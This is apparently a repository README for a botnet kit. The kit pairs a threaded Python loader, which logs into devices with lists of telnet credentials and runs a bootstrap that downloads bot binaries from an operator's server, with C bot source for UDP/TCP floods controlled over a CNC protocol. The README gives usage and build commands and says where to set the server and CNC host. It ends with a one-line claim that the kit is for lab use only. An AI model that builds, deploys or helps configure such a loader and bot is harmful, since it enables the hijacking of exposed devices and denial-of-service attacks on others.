# new

Telnet credential-driven **apex4** bot loader (Python) plus a custom Linux bot source tree.

## Files

| File | Description |
|------|-------------|
| `loader.py` | Threaded telnet login, runs arch-aware `run.sh` bootstrap |
| `epstine_diddyblud_67.c` | Standalone C bot (UDP/TCP flood, CNC protocol) |

## loader.py

- `MAX_WORKERS` default 300
- `RUN_SH_SCRIPT` — set `SERVER` to your HTTP binary host
- Input: telnet lines `ip:port user:pass` (see script)

```bash
python3 loader.py telnets.txt
```

## Bot build

```bash
gcc -o bot epstine_diddyblud_67.c   # add Makefile if you create one
```

Edit CNC host/port in the C source before lab use.

## Disclaimer

Authorized telnet lab devices only (e.g. honeypot/classroom).
